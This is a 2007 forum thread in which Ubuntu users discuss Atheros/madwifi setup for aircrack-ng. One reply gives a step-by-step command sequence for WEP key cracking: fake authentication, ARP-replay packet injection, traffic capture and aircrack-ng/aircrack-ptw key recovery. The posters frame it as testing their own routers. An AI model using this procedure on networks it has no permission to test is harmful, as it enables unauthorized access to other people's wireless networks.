---
title: "Madwifi, aireplay-NG"
date: 2007-06-28
forum: Networking &amp; Wireless
---

### Post by Tavorisch on 2007-06-28
Hello all, this is my first post on this forum and I am somewhat new to Ubuntu!
I was however so far, able to get ATI/Radeon drivers working for a 9600 mobile.
with X11 drivers, and force direct rendering via options in xorg.conf~~ etc. and run beryl (somewhat choppy with certain effects but still helpful)
Also I recently purchased a WG511T netgear cardbus, b/g/super g atheros chipset
after many of readings on posts and a few weeks aireplay-ng works! i am able
to do -2 attack on my router at 220-260 #/ps now i didn't wanna post until i have read /tried everything.
Now.. my main question is..  Aireplay-ng so far ive gotten -2 and -3, to work right after --deauth, or -0
and  also -1 on some routers. I would like to run two instances of aireply, but i get an error
dev/resource busy. on ath0.. the first thing that came to mind was creating another <i face>how would I do this?
I think i tried it while both wifi0 and ath0 were up..
wlanconfig ath1 create wlandev wifi0 wlanmode monitor, am i doing this wrong? should i put down everything and start from scratch? if anyone knows please send me link or reply!
thank you much! for any time.

---

### Post by tturrisi on 2007-06-28
Easiest to create 2 or more interfaces from the start.
btw, have you tried aircrack-ptw yet?  I cracked my home WEP in under 2 minutes.

---

### Post by Tavorisch on 2007-06-28
Wow!, I havn't even heard of aircrack-ptw, same idea as aircrack-ng? comes with airodump-ptw aireplay-ptw etc? I was figuring since i can get 100-200 #/ps from --arpreplay and 200-250 #/s from -2 attack, I could maybe do it in less than 10 minutes. or crack 128-bit in 10 minutes. if I were to use both those attacks. Also I will search for aircrack-ptw, also could you send a link incase I can't find it? thanks much for the replay sir!

---

### Post by tturrisi on 2007-06-29
> **Tavorisch said:**
> Wow!, I havn't even heard of aircrack-ptw, same idea as aircrack-ng? comes with airodump-ptw aireplay-ptw etc? I was figuring since i can get 100-200 #/ps from --arpreplay and 200-250 #/s from -2 attack, I could maybe do it in less than 10 minutes. or crack 128-bit in 10 minutes. if I were to use both those attacks. Also I will search for aircrack-ptw, also could you send a link incase I can't find it? thanks much for the replay sir!

Aircrack-ptw is included in the latest stable release of aircrack-ng. 
Uninstall your existing version if it is not version 0.9.1.  Then get the latest version:
[http://www.aircrack-ng.org/doku.php?id=install_aircrack&DokuWiki=6b3231bcec8ba4c5c06b9406cf04f150](http://www.aircrack-ng.org/doku.php?id=install_aircrack&DokuWiki=6b3231bcec8ba4c5c06b9406cf04f150)

then do:
```
where xx:= ap mac & yy: = adapter mac
1. airmon-ng stop ath0
2. airmon-ng start wifi0 11
3. ifconfig ath0 up
4. aireplay-ng -1 0 -e 8724 -a xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy ath0
5. airodump-ng -c 11 --bssid xx:xx:xx:xx:xx:xx --ivs -w output ath0  (in new window)  {OR do 5b & 7b for aircrack-ptw}
5a.airodump-ng -c 11 --bssid xx:xx:xx:xx:xx:xx-w output ath0 (remove --ivs for 7b.)
6. aireplay-ng -3 -b xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy  ath0  (in new window)
7. aircrack-ng -b xx:xx:xx:xx:xx:xx output*.ivs
7b. aircrack-ptw output-01.cap
```

---

